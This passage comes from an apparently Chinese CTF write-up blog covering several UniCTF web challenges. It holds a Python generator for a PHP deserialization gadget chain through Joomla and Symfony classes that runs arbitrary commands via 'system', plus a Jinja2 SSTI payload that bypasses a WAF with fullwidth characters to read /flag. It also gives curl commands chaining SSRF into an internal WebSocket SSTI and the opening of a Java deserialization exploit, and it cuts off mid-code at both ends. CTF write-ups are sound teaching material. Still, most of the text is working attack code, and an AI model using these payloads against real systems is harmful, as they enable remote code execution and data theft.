class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> data<span class="keyword">class</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">try</span>:</span><br><span class="line">    <span class="keyword">import</span> requests  # <span class="attr">type</span>: ignore</span><br><span class="line">except <span class="title class_">Exception</span>:</span><br><span class="line">    requests = <span class="title class_">None</span></span><br><span class="line"></span><br><span class="line">@data<span class="keyword">class</span></span><br><span class="line"><span class="title class_">class</span> <span class="title class_">Obj</span>:</span><br><span class="line">    <span class="attr">class_name</span>: str</span><br><span class="line">    <span class="attr">props</span>: dict</span><br><span class="line"></span><br><span class="line">def <span class="title function_">_s</span>(<span class="attr">data</span>: bytes) -&gt; <span class="attr">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> b<span class="string">&#x27;s:%d:&quot;&#x27;</span> % <span class="title function_">len</span>(data) + data + b<span class="string">&#x27;&quot;;&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">_i</span>(<span class="attr">n</span>: int) -&gt; <span class="attr">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> b<span class="string">&#x27;i:%d;&#x27;</span> % n</span><br><span class="line"></span><br><span class="line">def <span class="title function_">_b</span>(<span class="attr">v</span>: bool) -&gt; <span class="attr">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> b<span class="string">&#x27;b:1;&#x27;</span> <span class="keyword">if</span> v <span class="keyword">else</span> b<span class="string">&#x27;b:0;&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">_n</span>() -&gt; <span class="attr">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> b<span class="string">&#x27;N;&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">_a</span>(<span class="attr">items</span>: list) -&gt; <span class="attr">bytes</span>:</span><br><span class="line">    out = b<span class="string">&#x27;a:%d:&#123;&#x27;</span> % <span class="title function_">len</span>(items)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="attr">items</span>:</span><br><span class="line">        out += <span class="title function_">serialize</span>(k)</span><br><span class="line">        out += <span class="title function_">serialize</span>(v)</span><br><span class="line">    out += b<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">def <span class="title function_">serialize</span>(obj):</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(obj, <span class="title class_">Obj</span>):</span><br><span class="line">        cname = obj.<span class="property">class_name</span>.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        props_items = <span class="title function_">list</span>(obj.<span class="property">props</span>.<span class="title function_">items</span>())</span><br><span class="line">        out = b<span class="string">&#x27;O:%d:&quot;&#x27;</span> % <span class="title function_">len</span>(cname) + cname + b<span class="string">&#x27;&quot;:%d:&#123;&#x27;</span> % <span class="title function_">len</span>(props_items)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="attr">props_items</span>:</span><br><span class="line">            <span class="keyword">if</span> not <span class="title function_">isinstance</span>(k, (str, bytes)):</span><br><span class="line">                raise <span class="title class_">TypeError</span>(<span class="string">&#x27;property name must be str/bytes&#x27;</span>)</span><br><span class="line">            k_bytes = k <span class="keyword">if</span> <span class="title function_">isinstance</span>(k, bytes) <span class="keyword">else</span> k.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            out += <span class="title function_">_s</span>(k_bytes)</span><br><span class="line">            out += <span class="title function_">serialize</span>(v)</span><br><span class="line">        out += b<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    <span class="keyword">if</span> obj is <span class="title class_">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_n</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(obj, bool):</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_b</span>(obj)</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(obj, int):</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_i</span>(obj)</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(obj, bytes):</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_s</span>(obj)</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(obj, str):</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_s</span>(obj.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(obj, list):</span><br><span class="line">        items = [(i, v) <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="title function_">enumerate</span>(obj)]</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_a</span>(items)</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(obj, dict):</span><br><span class="line">        items = <span class="title function_">list</span>(obj.<span class="title function_">items</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_a</span>(items)</span><br><span class="line">    raise <span class="title class_">TypeError</span>(f<span class="string">&#x27;unsupported type: &#123;type(obj)&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">priv</span>(<span class="attr">cls</span>: str, <span class="attr">prop</span>: str) -&gt; <span class="attr">str</span>:</span><br><span class="line">    <span class="keyword">return</span> f<span class="string">&quot;\x00&#123;cls&#125;\x00&#123;prop&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">prot</span>(<span class="attr">prop</span>: str) -&gt; <span class="attr">str</span>:</span><br><span class="line">    <span class="keyword">return</span> f<span class="string">&quot;\x00*\x00&#123;prop&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">build_payload</span>(<span class="attr">cmd</span>: str) -&gt; <span class="attr">bytes</span>:</span><br><span class="line">    # <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">String</span>\<span class="title class_">LazyString</span> <span class="keyword">with</span> private $value = cmd</span><br><span class="line">    lazy = <span class="title class_">Obj</span>(</span><br><span class="line">        <span class="string">&#x27;Symfony\\Component\\String\\LazyString&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Symfony\\Component\\String\\LazyString&#x27;</span>, <span class="string">&#x27;value&#x27;</span>): cmd,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # <span class="title class_">Joomla</span>\<span class="variable constant_">DI</span>\<span class="title class_">ContainerResource</span> <span class="keyword">with</span> private $container = lazy, $factory = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    res = <span class="title class_">Obj</span>(</span><br><span class="line">        <span class="string">&#x27;Joomla\\DI\\ContainerResource&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\DI\\ContainerResource&#x27;</span>, <span class="string">&#x27;container&#x27;</span>): lazy,</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\DI\\ContainerResource&#x27;</span>, <span class="string">&#x27;instance&#x27;</span>): <span class="title class_">None</span>,</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\DI\\ContainerResource&#x27;</span>, <span class="string">&#x27;factory&#x27;</span>): <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\DI\\ContainerResource&#x27;</span>, <span class="string">&#x27;shared&#x27;</span>): <span class="title class_">False</span>,</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\DI\\ContainerResource&#x27;</span>, <span class="string">&#x27;protected&#x27;</span>): <span class="title class_">False</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # <span class="title class_">Joomla</span>\<span class="variable constant_">DI</span>\<span class="title class_">Container</span> <span class="keyword">with</span> protected $resources[<span class="string">&#x27;svc&#x27;</span>] = res</span><br><span class="line">    container = <span class="title class_">Obj</span>(</span><br><span class="line">        <span class="string">&#x27;Joomla\\DI\\Container&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;aliases&#x27;</span>): &#123;&#125;,</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;resources&#x27;</span>): &#123;<span class="string">&#x27;svc&#x27;</span>: res&#125;,</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;parent&#x27;</span>): <span class="title class_">None</span>,</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;tags&#x27;</span>): &#123;&#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # <span class="title class_">Joomla</span>\<span class="title class_">Event</span>\<span class="title class_">LazyServiceEventListener</span></span><br><span class="line">    listener = <span class="title class_">Obj</span>(</span><br><span class="line">        <span class="string">&#x27;Joomla\\Event\\LazyServiceEventListener&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\Event\\LazyServiceEventListener&#x27;</span>, <span class="string">&#x27;container&#x27;</span>): container,</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\Event\\LazyServiceEventListener&#x27;</span>, <span class="string">&#x27;serviceId&#x27;</span>): <span class="string">&#x27;svc&#x27;</span>,</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\Event\\LazyServiceEventListener&#x27;</span>, <span class="string">&#x27;method&#x27;</span>): <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # <span class="title class_">Joomla</span>\<span class="title class_">Event</span>\<span class="title class_">ListenersPriorityQueue</span> <span class="keyword">with</span> private $listeners</span><br><span class="line">    lpq = <span class="title class_">Obj</span>(</span><br><span class="line">        <span class="string">&#x27;Joomla\\Event\\ListenersPriorityQueue&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\Event\\ListenersPriorityQueue&#x27;</span>, <span class="string">&#x27;listeners&#x27;</span>): &#123;<span class="number">0</span>: [listener]&#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # <span class="title class_">Joomla</span>\<span class="title class_">Event</span>\<span class="title class_">Dispatcher</span> <span class="keyword">with</span> protected $listeners</span><br><span class="line">    dispatcher = <span class="title class_">Obj</span>(</span><br><span class="line">        <span class="string">&#x27;Joomla\\Event\\Dispatcher&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;events&#x27;</span>): &#123;&#125;,</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;listeners&#x27;</span>): &#123;<span class="string">&#x27;onAfterDisconnect&#x27;</span>: lpq&#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # <span class="title class_">Joomla</span>\<span class="title class_">Database</span>\<span class="title class_">Mysqli</span>\<span class="title class_">MysqliDriver</span> <span class="keyword">with</span> private $dispatcher (<span class="keyword">from</span> <span class="title class_">DatabaseDriver</span>)</span><br><span class="line">    driver = <span class="title class_">Obj</span>(</span><br><span class="line">        <span class="string">&#x27;Joomla\\Database\\Mysqli\\MysqliDriver&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">priv</span>(<span class="string">&#x27;Joomla\\Database\\DatabaseDriver&#x27;</span>, <span class="string">&#x27;dispatcher&#x27;</span>): dispatcher,</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;connection&#x27;</span>): <span class="title class_">None</span>,</span><br><span class="line">            <span class="title function_">prot</span>(<span class="string">&#x27;statement&#x27;</span>): <span class="title class_">None</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">serialize</span>(driver)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">len</span>(sys.<span class="property">argv</span>) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&#x27;Usage: python build_payload.py &lt;cmd&gt; [url]&#x27;</span>)</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&#x27;   or: python build_payload.py --url &lt;url&gt; -- &lt;cmd...&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    url = <span class="title class_">None</span></span><br><span class="line">    args = sys.<span class="property">argv</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--url&#x27;</span> <span class="keyword">in</span> <span class="attr">args</span>:</span><br><span class="line">        idx = args.<span class="title function_">index</span>(<span class="string">&#x27;--url&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> idx + <span class="number">1</span> &gt;= <span class="title function_">len</span>(args):</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&#x27;missing url after --url&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        url = args[idx + <span class="number">1</span>]</span><br><span class="line">        args = args[:idx] + args[idx + <span class="number">2</span> :]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--&#x27;</span> <span class="keyword">in</span> <span class="attr">args</span>:</span><br><span class="line">        idx = args.<span class="title function_">index</span>(<span class="string">&#x27;--&#x27;</span>)</span><br><span class="line">        cmd_parts = args[idx + <span class="number">1</span> :]</span><br><span class="line">        args = args[:idx]</span><br><span class="line">        <span class="keyword">if</span> not <span class="attr">cmd_parts</span>:</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&#x27;missing cmd after --&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        cmd = <span class="string">&#x27; &#x27;</span>.<span class="title function_">join</span>(cmd_parts)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        cmd = args[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span>(args) &gt; <span class="number">1</span> and url is <span class="title class_">None</span>:</span><br><span class="line">            url = args[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="title function_">build_payload</span>(cmd)</span><br><span class="line">    b64 = base64.<span class="title function_">b64encode</span>(payload).<span class="title function_">decode</span>()</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;b64:&#x27;</span>, b64)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="attr">url</span>:</span><br><span class="line">        <span class="keyword">if</span> requests is <span class="title class_">None</span>:</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&#x27;requests not available&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        resp = requests.<span class="title function_">post</span>(url.<span class="title function_">rstrip</span>(<span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;/unser.php&#x27;</span>, data=&#123;<span class="string">&#x27;unser&#x27;</span>: b64&#125;, timeout=<span class="number">15</span>)</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&#x27;status:&#x27;</span>, resp.<span class="property">status_code</span>)</span><br><span class="line">        <span class="title function_">print</span>(resp.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后env拿到flag</p>
+<p>UNICTF_FLAG&#x3D;UniCTF{7d991591-3c26-4429-ae21-1ad79e165959}</p>
+<h3 id="GlyphWeaver"><a href="#GlyphWeaver" class="headerlink" title="GlyphWeaver"></a><strong>GlyphWeaver</strong></h3><ul>
+<li>站点是卡片渲染器（Jinja2），&#x2F;api&#x2F;preview 只渲染一次，不会执行变量里的模板语法。</li>
+<li>export 管线会二次渲染：第一次把用户输入拼进 HTML，第二次把整段 HTML 当模板再渲染 → 触发 SSTI。</li>
+<li>WAF 阻断 <code>&#123;&#123;</code> 和 <code>__</code>，但服务端会做 NFKC 规范化，所以用全角字符绕过 → 规范化后变回 ASCII。</li>
+<li>display_name 长度只有 24，不够放 payload，所以把 payload 放在 motto（最长 160）。</li>
+</ul>
+<p>关键验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 1. 用全角大括号绕过 WAF：｛｛7*7｝｝（NFKC 后变成 &#123;&#123;7*7&#125;&#125;）</span><br><span class="line"> 2. export 任务结果里出现 49，证明二次渲染成立。</span><br></pre></td></tr></table></figure>
+
+<p>最终利用（命令示例）<br>  下面这段脚本会：构造全角 payload → 发送 &#x2F;api&#x2F;export → 轮询 &#x2F;api&#x2F;task&#x2F;<id> → 在 HTML 里读到 flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  import json,urllib.request,time</span><br><span class="line"> </span><br><span class="line">   base=&#x27;http://5000-69d6a2e9-6131-4f5f-889f-7ecfb3792263.challenge.ctfplus.cn&#x27;</span><br><span class="line">   def to_fullwidth(s):</span><br><span class="line">       return &#x27;&#x27;.join(chr(ord(c)+0xFEE0) if 0x21&lt;=ord(c)&lt;=0x7E else c for c in s)</span><br><span class="line"> </span><br><span class="line">   expr=&quot;&#123;&#123;cycler.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&quot;</span><br><span class="line">   fw=to_fullwidth(expr)</span><br><span class="line"> </span><br><span class="line">   body=&#123;&#x27;template_id&#x27;:&#x27;classic&#x27;,&#x27;display_name&#x27;:&#x27;A&#x27;,&#x27;title&#x27;:&#x27;t&#x27;,&#x27;motto&#x27;:fw,&#x27;footer&#x27;:&#x27;f&#x27;&#125;</span><br><span class="line">   req=urllib.request.Request(base+&#x27;/api/export&#x27;, data=json.dumps(body,ensure_ascii=False).encode(&#x27;utf-8&#x27;),</span><br><span class="line">                              headers=&#123;&#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;)</span><br><span class="line">   res=json.loads(urllib.request.urlopen(req).read().decode())</span><br><span class="line">   task_id=res[&#x27;taskId&#x27;]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Repeater 再 GET &#x2F;api&#x2F;task&#x2F;<taskId>，在响应 HTML 的 data-motto 中取 flag。</li>
+<li>全角化处理可在 Burp 中手动输入，或先用上面脚本生成后复制进 Burp。</li>
+</ul>
+<p>截图说明（你可在 Burp 中截取）</p>
+<ul>
+<li>截图1：&#x2F;api&#x2F;export 返回 taskId 的响应。</li>
+<li>截图2：&#x2F;api&#x2F;task&#x2F;<taskId> 响应中 data-motto&#x3D;”UniCTF{…}” 的位置。</li>
+<li>截图3：日志里出现 normalize: NFKC applied（证明全角绕过生效）。</li>
+</ul>
+<h3 id="intrasight"><a href="#intrasight" class="headerlink" title="intrasight"></a><strong>intrasight</strong></h3><p>拿到 flag 了：UniCTF{de004cfd-54fc-4490-a0da-772745d740a0}</p>
+<p>解题思路（精简版）</p>
+<ul>
+<li>&#x2F;fetch 是 SSRF 入口，可访问内网服务。</li>
+<li>内网 admin_panel 在 127.0.0.1:8001，&#x2F;redirect_ws 返回到内网 WS 的 token。</li>
+<li>WS 服务在 127.0.0.1:9000&#x2F;ws，需要：<ul>
+<li>Origin: <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></li>
+<li>X-Internal-Token: <token> 且 token 与 ?token&#x3D;一致</li>
+</ul>
+</li>
+<li>WS 协议支持 render 动作，模板是 Jinja2，可 SSTI 读 &#x2F;flag。</li>
+</ul>
+<p>关键请求（可直接复现）</p>
+<ol>
+<li>取 token（看 JSON 的 history[0].location）：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &quot;http://80-252298d6-1662-474e-bd9e-bad117d0b262.challenge.ctfplus.cn/fetch?url=http://127.0.0.1:8001/redirect_ws&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>WS 渲染验证（49）：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST \</span><br><span class="line">    -H &quot;Origin: [http://127.0.0.1](http://127.0.0.1/)&quot; \</span><br><span class="line">    -H &quot;X-Internal-Token: &lt;token&gt;&quot; \</span><br><span class="line">    -d &#x27;&#123;&quot;action&quot;:&quot;render&quot;,&quot;template&quot;:&quot;&#123;&#123;7*7&#125;&#125;&quot;,&quot;context&quot;:&#123;&#125;&#125;&#x27; \</span><br><span class="line">    &quot;[http://80-252298d6-1662-474e-bd9e-bad117d0b262.challenge.ctfplus.cn/fetch?url=ws://127.0.0.1:9000/ws?token=](http://80-252298d6-1662-474e-bd9e-bad117d0b262.challenge.ctfplus.cn/fetch?url=ws://127.0.0.1:9000/ws?token=)&lt;token&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>读 flag：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST \</span><br><span class="line">    -H &quot;Origin: [http://127.0.0.1](http://127.0.0.1/)&quot; \</span><br><span class="line">    -H &quot;X-Internal-Token: &lt;token&gt;&quot; \</span><br><span class="line">    -d &#x27;&#123;&quot;action&quot;:&quot;render&quot;,&quot;template&quot;:&quot;&#123;&#123; cycler.**init**.**globals**[&quot;**builtins**&quot;](https://www.notion.so/UniCTF-WP-2f7744a554888061ad06cd2a75c8e8de?pvs=21)(&quot;/</span><br><span class="line">  flag&quot;).read() &#125;&#125;&quot;,&quot;context&quot;:&#123;&#125;&#125;&#x27; \</span><br><span class="line">    &quot;http://80-252298d6-1662-474e-bd9e-bad117d0b262.challenge.ctfplus.cn/fetch?url=ws://127.0.0.1:9000/ws?token=&lt;token&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Burp Suite MCP 思路（两步链）</p>
+<ol>
+<li>Request 1：GET &#x2F;fetch?url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8001/redirect_ws">http://127.0.0.1:8001/redirect_ws</a><ul>
+<li>用 MCP 提取 location 里的 token&#x3D;…</li>
+</ul>
+</li>
+<li>Request 2：POST &#x2F;fetch?url&#x3D;ws:&#x2F;&#x2F;127.0.0.1:9000&#x2F;ws?token&#x3D;<token><ul>
+<li>Header：Origin: <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></li>
+<li>Header：X-Internal-Token: <token></li>
+<li>Body：Jinja2 SSTI 模板读 &#x2F;flag</li>
+</ul>
+</li>
+</ol>
+<h3 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a><strong>ezjava</strong></h3><p>解题思路</p>
+<ul>
+<li>反编译发现只有两个关键入口：&#x2F; 给出提示，&#x2F;api&#x2F;user&#x2F;settings&#x2F;import 处理 Base64 二进制包。</li>
+<li>importSettings 逻辑：readUTF 读取 identity、readInt 读取 version、随后 readObject 反序列化对象；通过 logger.info(…, obj) 触发 obj.toString()。</li>
+<li>ConfigDataWrapper.toString() 在 sign &#x3D;&#x3D; “ready” 且 ClassByte !&#x3D; null 时，会对字节异或 0xFF 后调用 ClassLoader#defineClass，并 newInstance()。</li>
+<li>利用点：构造一个 ConfigDataWrapper，塞入“异或过的 Exploit.class”，在构造函数里读取 flag，并把 flag 写进当前响应头&#x2F;响应体。</li>
+</ul>
+<p>Exploit.java：反射拿到 HttpServletResponse，写 X-Flag 与响应体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"> import java.io.BufferedReader;</span><br><span class="line"> import java.io.File;</span><br><span class="line"> import java.io.FileInputStream;</span><br><span class="line"> import java.io.InputStreamReader;</span><br><span class="line"> import java.nio.charset.StandardCharsets;</span><br><span class="line"> import java.util.Base64;</span><br><span class="line"> </span><br><span class="line"> public class Exploit &#123;</span><br><span class="line">     